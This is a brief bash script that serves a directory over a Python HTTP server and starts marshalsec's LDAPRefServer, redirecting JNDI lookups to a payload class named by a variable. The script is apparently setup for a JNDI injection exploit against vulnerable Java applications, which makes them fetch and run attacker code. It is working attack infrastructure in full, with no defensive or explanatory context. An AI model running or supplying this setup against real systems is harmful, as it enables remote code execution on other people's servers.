#!/bin/bash
cd /exp/
python -m SimpleHTTPServer &
java -cp marshalsec-*-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#$EXPNAME $PORT
